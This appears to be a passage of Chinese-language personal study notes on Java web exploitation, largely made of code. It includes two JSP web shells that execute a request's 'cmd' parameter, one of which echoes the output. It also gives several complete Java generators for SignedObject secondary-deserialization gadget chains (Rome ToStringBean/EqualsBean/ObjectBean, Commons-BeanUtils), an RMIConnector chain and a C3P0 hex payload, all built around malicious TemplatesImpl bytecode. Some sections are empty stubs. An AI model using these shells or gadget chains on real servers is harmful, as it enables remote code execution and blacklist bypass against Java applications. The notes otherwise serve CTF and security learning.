<h3 id="Log4j2-2-15-0-漏洞修复与绕过"><a href="#Log4j2-2-15-0-漏洞修复与绕过" class="headerlink" title="Log4j2 2.15.0 漏洞修复与绕过"></a>Log4j2 2.15.0 漏洞修复与绕过</h3><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><h1 id="内存码"><a href="#内存码" class="headerlink" title="内存码"></a>内存码</h1><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><h2 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h2><p>Apache 是 Web 服务器（静态解析，如 HTML），Tomcat 是 java 应用服务器（动态解析，如 JSP）</p>
<p>Tomcat 只是一个 servlet (jsp 也翻译成 servlet)容器，可以认为是 Apache 的扩展，但是可以独立于 Apache 运行。</p>
<ul>
<li>一句话概括一下，就是 Web 服务器，比较不稳定，但是业务能力比较强。</li>
</ul>
<h2 id="码"><a href="#码" class="headerlink" title="码"></a>码</h2><h3 id="传统码"><a href="#传统码" class="headerlink" title="传统码"></a>传统码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line"></span><br><span class="line">	Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h3 id="回显码"><a href="#回显码" class="headerlink" title="回显码"></a>回显码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if(request.getParameter(&quot;cmd&quot;)!=null)&#123;</span><br><span class="line">    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    while((a=in.read(b))!=-1)&#123;</span><br><span class="line">        out.print(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h2 id="filter码"><a href="#filter码" class="headerlink" title="filter码"></a>filter码</h2><h1 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h1><p>对于 rome 来说，二次反序列化多用于目标不出网的情况（当然也可以用于绕过黑名单）</p>
<p>而 CB 这条，唯一作用就是绕过黑名单了吧</p>
<p>参考</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://zjackky.github.io/post/java-security-talking-for-secondary-desequentization-z1daqqv.html#Jackson%E9%93%BE">https://zjackky.github.io/post/java-security-talking-for-secondary-desequentization-z1daqqv.html#Jackson%E9%93%BE</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15977">https://xz.aliyun.com/news/15977</a></li>
<li><a target="_blank" rel="noopener" href="https://zixyd.github.io/2024/03/21/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#Rome">https://zixyd.github.io/2024/03/21/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#Rome</a></li>
<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1701/#toc_signedobject">https://tttang.com/archive/1701/#toc_signedobject</a></li>
</ol>
<h2 id="路线"><a href="#路线" class="headerlink" title="路线"></a>路线</h2><ol>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaorenyusi/p/18396846">启蒙</a></li>
<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1701/">核心，我用的模板|hashmap&#x2F;hashtable</a></li>
<li></li>
</ol>
<h2 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h2><p><code>SignedObject</code>包含另一个<code>Serializable</code>对象。</p>
<ol>
<li>调用它的<code>getObject()</code>方法</li>
</ol>
<h2 id="signedObject"><a href="#signedObject" class="headerlink" title="signedObject"></a>signedObject</h2><h3 id="引用1rome"><a href="#引用1rome" class="headerlink" title="引用1rome"></a>引用1rome</h3><h3 id="一tostring"><a href="#一tostring" class="headerlink" title="一tostring"></a>一tostring</h3><p>rome 的<code>ToStringBean</code>的<code>toString()</code>方法可以办到调用 getter 方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.test;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.security.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line">import com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line">import com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line">import static org.example.fj2.test.Tool.*;</span><br><span class="line">public class R2_toString &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;</span><br><span class="line">                payload(&quot;mate-calc&quot;).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(obj, &quot;_name&quot;, &quot;Poria&quot;);</span><br><span class="line">        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Hashtable table1 = getPayload(Templates.class, obj);</span><br><span class="line"></span><br><span class="line">        KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span><br><span class="line">        kpg.initialize(1024);</span><br><span class="line">        KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">        SignedObject signedObject = new SignedObject(table1, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;));</span><br><span class="line"></span><br><span class="line">        Hashtable table2 = getPayload(SignedObject.class, signedObject);</span><br><span class="line"></span><br><span class="line">        run(table2, &quot;debug&quot;, &quot;object&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Hashtable getPayload (Class clazz, Object payloadObj) throws Exception&#123;</span><br><span class="line">//        ObjectBean objectBean = new ObjectBean(ToStringBean.class, new ToStringBean(clazz, payloadObj));</span><br><span class="line">//        HashMap hashMap = new HashMap();</span><br><span class="line">//        hashMap.put(objectBean, &quot;rand&quot;);</span><br><span class="line">//        return hashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //EqualsBean bean = new EqualsBean(String.class, &quot;r&quot;);</span><br><span class="line">        ObjectBean objectBean = new ObjectBean(ToStringBean.class, new ToStringBean(clazz, payloadObj));</span><br><span class="line">        HashMap map1 = new HashMap();</span><br><span class="line">        HashMap map2 = new HashMap();</span><br><span class="line">        map1.put(&quot;yy&quot;, objectBean);</span><br><span class="line">        map1.put(&quot;zZ&quot;, payloadObj);</span><br><span class="line">        map2.put(&quot;zZ&quot;, objectBean);</span><br><span class="line">        map2.put(&quot;yy&quot;, payloadObj);</span><br><span class="line">        Hashtable table = new Hashtable();</span><br><span class="line">        table.put(map1, &quot;1&quot;);</span><br><span class="line">        table.put(map2, &quot;2&quot;);</span><br><span class="line">        setFieldValue(objectBean, &quot;_beanClass&quot;, clazz);</span><br><span class="line">        setFieldValue(objectBean, &quot;_obj&quot;, payloadObj);</span><br><span class="line">        return table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="二equal"><a href="#二equal" class="headerlink" title="二equal"></a>二equal</h3><p>ObjectBean#equals ()，</p>
<p>转折点在于<code>pReadMethod.invoke(_obj,NO_PARAMS)</code>，<code>EqualsBean</code>也存在这个关键代码</p>
<p>利用<code>Hashtable</code>来触发<code>equals</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.test;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.security.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">import static org.example.fj2.test.Tool.*;</span><br><span class="line"></span><br><span class="line">public class R_SignedObject &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;</span><br><span class="line">                payload(&quot;mate-calc&quot;).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(obj, &quot;_name&quot;, &quot;Poria&quot;);</span><br><span class="line">        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Hashtable table1 = getPayload(Templates.class, obj);</span><br><span class="line"></span><br><span class="line">        KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span><br><span class="line">        kpg.initialize(1024);</span><br><span class="line">        KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">        SignedObject signedObject = new SignedObject(table1, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;));</span><br><span class="line"></span><br><span class="line">        Hashtable table2 = getPayload(SignedObject.class, signedObject);</span><br><span class="line"></span><br><span class="line">        run(table2, &quot;debug&quot;, &quot;object&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Hashtable getPayload (Class clazz, Object payloadObj) throws Exception&#123;</span><br><span class="line">        EqualsBean bean = new EqualsBean(String.class, &quot;r&quot;);</span><br><span class="line">        HashMap map1 = new HashMap();</span><br><span class="line">        HashMap map2 = new HashMap();</span><br><span class="line">        map1.put(&quot;yy&quot;, bean);</span><br><span class="line">        map1.put(&quot;zZ&quot;, payloadObj);</span><br><span class="line">        map2.put(&quot;zZ&quot;, bean);</span><br><span class="line">        map2.put(&quot;yy&quot;, payloadObj);</span><br><span class="line">        Hashtable table = new Hashtable();</span><br><span class="line">        table.put(map1, &quot;1&quot;);</span><br><span class="line">        table.put(map2, &quot;2&quot;);</span><br><span class="line">        setFieldValue(bean, &quot;_beanClass&quot;, clazz);</span><br><span class="line">        setFieldValue(bean, &quot;_obj&quot;, payloadObj);</span><br><span class="line">        return table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="三ObjectBean"><a href="#三ObjectBean" class="headerlink" title="三ObjectBean"></a>三ObjectBean</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.test;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line">import com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.security.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">import static org.example.fj2.test.Tool.*;</span><br><span class="line">public class R_test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;</span><br><span class="line">                payload(&quot;mate-calc&quot;).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(obj, &quot;_name&quot;, &quot;Poria&quot;);</span><br><span class="line">        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        HashMap hashMap1 = getpayload(Templates.class, obj);</span><br><span class="line"></span><br><span class="line">        KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span><br><span class="line">        kpg.initialize(1024);</span><br><span class="line">        KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">        SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;));</span><br><span class="line"></span><br><span class="line">        HashMap hashMap2 = getpayload(SignedObject.class, signedObject);</span><br><span class="line"></span><br><span class="line">        run(hashMap2, &quot;debug&quot;, &quot;object&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static HashMap getpayload(Class clazz, Object obj) throws Exception &#123;</span><br><span class="line">        ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, &quot;rand&quot;));</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(objectBean, &quot;rand&quot;);</span><br><span class="line">        ObjectBean expObjectBean = new ObjectBean(clazz, obj);</span><br><span class="line">        setFieldValue(objectBean, &quot;_equalsBean&quot;, new EqualsBean(ObjectBean.class, expObjectBean));</span><br><span class="line">        return hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h3 id="引用2cb"><a href="#引用2cb" class="headerlink" title="引用2cb"></a>引用2cb</h3><p>Commons-BeanUtils 中提供了一个静态方法 <code>PropertyUtils.getProperty</code> ，让使用者可以直接调用任意 JavaBean 的 getter 方法，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.test;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.beanutils.BeanComparator;</span><br><span class="line">import java.security.KeyPair;</span><br><span class="line">import java.security.KeyPairGenerator;</span><br><span class="line">import java.security.Signature;</span><br><span class="line">import java.security.SignedObject;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">import static org.example.fj2.test.Tool.*;</span><br><span class="line"></span><br><span class="line">public class CB_SingedfObject &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;</span><br><span class="line">                payload(&quot;mate-calc&quot;).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(obj, &quot;_name&quot;, &quot;Poria&quot;);</span><br><span class="line">        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        PriorityQueue queue1 = getpayload(obj, &quot;outputProperties&quot;);</span><br><span class="line"></span><br><span class="line">        KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span><br><span class="line">        kpg.initialize(1024);</span><br><span class="line">        KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">        SignedObject signedObject = new SignedObject(queue1, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;));</span><br><span class="line"></span><br><span class="line">        PriorityQueue queue2 = getpayload(signedObject, &quot;object&quot;);</span><br><span class="line"></span><br><span class="line">        run(queue2, &quot;debug&quot;, &quot;object&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static PriorityQueue&lt;Object&gt; getpayload(Object object, String string) throws Exception &#123;</span><br><span class="line">        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);</span><br><span class="line">        priorityQueue.add(&quot;1&quot;);</span><br><span class="line">        priorityQueue.add(&quot;2&quot;);</span><br><span class="line">        setFieldValue(beanComparator, &quot;property&quot;, string);</span><br><span class="line">        setFieldValue(priorityQueue, &quot;queue&quot;, new Object[]&#123;object, null&#125;);</span><br><span class="line">        return priorityQueue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="高版本fastjson，"><a href="#高版本fastjson，" class="headerlink" title="高版本fastjson，"></a>高版本fastjson，</h3><p>具体的看做题的，vnctf2025</p>
<p>用于fastjson，调用只依赖于<code>FastJson</code>的包的<code>gadget</code></p>
<p>而正好<code>JsonObject#toString</code>可以触发任意<code>getter</code>方法，</p>
<p>而<code>toString</code>又可以通过</p>
<h4 id="一BadAttributeValueExpException-readObject"><a href="#一BadAttributeValueExpException-readObject" class="headerlink" title="一BadAttributeValueExpException#readObject"></a>一BadAttributeValueExpException#readObject</h4><p>调用，因此整条链子就通了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="二HotSwappableTargetSource"><a href="#二HotSwappableTargetSource" class="headerlink" title="二HotSwappableTargetSource"></a>二HotSwappableTargetSource</h4><p>通过equal触发tostring</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject -&gt; HotSwappableTargetSource#equals -&gt; XString#equals -&gt; toString</span><br></pre></td></tr></table></figure>

<p>otSwappableTargetSource 是在 Spring AOP 中出现的一个类是spring 原生的 toString 利用链。</p>
<p>依赖条件 ● jackson-databind、spring-aop</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h2><p><strong>有黑名单的时候很鸡肋</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.test;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import javax.management.remote.JMXServiceURL;</span><br><span class="line">import javax.management.remote.rmi.RMIConnector;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import static org.example.fj2.test.Tool.*;</span><br><span class="line"></span><br><span class="line">public class CC_RMIConnector &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://&quot;);</span><br><span class="line">        setFieldValue(jmxServiceURL, &quot;urlPath&quot;, &quot;/stub/base64string&quot;);</span><br><span class="line">        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;connect&quot;, null, null);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = new HashMap&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry, &quot;Poria&quot;);</span><br><span class="line">        lazyMap.remove(rmiConnector);</span><br><span class="line"></span><br><span class="line">        setFieldValue(lazyMap,&quot;factory&quot;, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        run(expMap, &quot;debug&quot;, &quot;object&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="WrapperConnectionPoolDataSource"><a href="#WrapperConnectionPoolDataSource" class="headerlink" title="WrapperConnectionPoolDataSource"></a>WrapperConnectionPoolDataSource</h2><p>是配合<code>Fastjson</code>、<code>Jackson</code>环境下不出网利用的打法</p>
<h3 id="C3P0-Hex"><a href="#C3P0-Hex" class="headerlink" title="C3P0_Hex"></a>C3P0_Hex</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.test;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.beanutils.BeanComparator;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">import static org.example.fj2.test.Tool.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Hex &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;</span><br><span class="line">                payload(&quot;mate-calc&quot;).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(obj, &quot;_name&quot;, &quot;Poria&quot;);</span><br><span class="line">        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);</span><br><span class="line">        queue.add(&quot;1&quot;);</span><br><span class="line">        queue.add(&quot;1&quot;);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);</span><br><span class="line">        setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, null&#125;);</span><br><span class="line"></span><br><span class="line">        run(queue, &quot;debug&quot;, &quot;hex&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="jackson"><a href="#jackson" class="headerlink" title="jackson"></a>jackson</h1><p><a target="_blank" rel="noopener" href="https://b1ue.cn/archives/189.html">cve参考</a></p>
<p><strong>JacksonPolymorphicDeserialization</strong> 即 Jackson 多态类型的反序列化</p>
<p>其实现有两种，即 <code>DefaultTyping</code> 和 <code>@JsonTypeInfo</code> 注解。</p>
<h2 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h2><table>
<thead>
<tr>
<th>DefaultTyping类型</th>
<th>描述说明</th>
</tr>
</thead>
<tbody><tr>
<td>JAVA_LANG_OBJECT</td>
<td>属性的类型为Object</td>
</tr>
<tr>
<td>OBJECT_AND_NON_CONCRETE</td>
<td>属性的类型为Object、Interface、AbstractClass</td>
</tr>
<tr>
<td>NON_CONCRETE_AND_ARRAYS</td>
<td>属性的类型为Object、Interface、AbstractClass、Array</td>
</tr>
<tr>
<td>NON_FINAL</td>
<td>所有除了声明为final之外的属性</td>
</tr>
</tbody></table>
<p><strong>默认情况下，即无参数的 enableDefaultTyping 是第二个设置，OBJECT_AND_NON_CONCRETE。</strong></p>
<h3 id="一-1"><a href="#一-1" class="headerlink" title="一"></a>一</h3><p><strong>JAVA_LANG_OBJECT</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br></pre></td></tr></table></figure>

<p>enableDefaultTyping() 设置设置 JAVA_LANG_OBJECT 后，会多输出 Hacker 类名，且在输出的 Object 属性时直接输出的是 Hacker 类对象</p>
<h3 id="二-1"><a href="#二-1" class="headerlink" title="二"></a>二</h3><p><strong>OBJECT_AND_NON_CONCRETE</strong></p>
